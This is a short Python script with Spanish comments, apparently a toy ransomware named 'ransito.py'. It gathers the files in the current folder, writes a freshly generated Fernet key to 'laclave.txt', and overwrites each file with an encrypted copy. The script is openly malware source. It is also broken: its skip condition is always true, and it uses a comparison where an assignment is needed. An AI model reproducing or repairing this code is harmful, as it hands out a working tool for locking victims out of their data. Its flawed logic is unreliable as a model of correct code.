import os

from cryptography.fernet import Fernet

#encontrar archivos en el directorio actual

archivos = []

for archivo in os.listdir():
        if archivo == "ransito.py" or "laclave.txt":
                continue
        if os.path.isfile (archivo):
                archivos.append(archivo)

print("archivos")

#se guarda clave en un archivo

clave = Fernet.generate_key()

with open("laclave.txt", "wb") as laclave:
        laclave.write(clave)

#encriptar archivos - bucle

for archivo in archivos:
        with open(archivo, "rb") as elarchivo:
                contenidos == elarchivo.read()
        contenidos_encriptados = Fernet(clave).encrypt(contenidos)
        with open(archivo, "wb") as elarchivo:
                elarchivo.write(contenidos_encriptados)
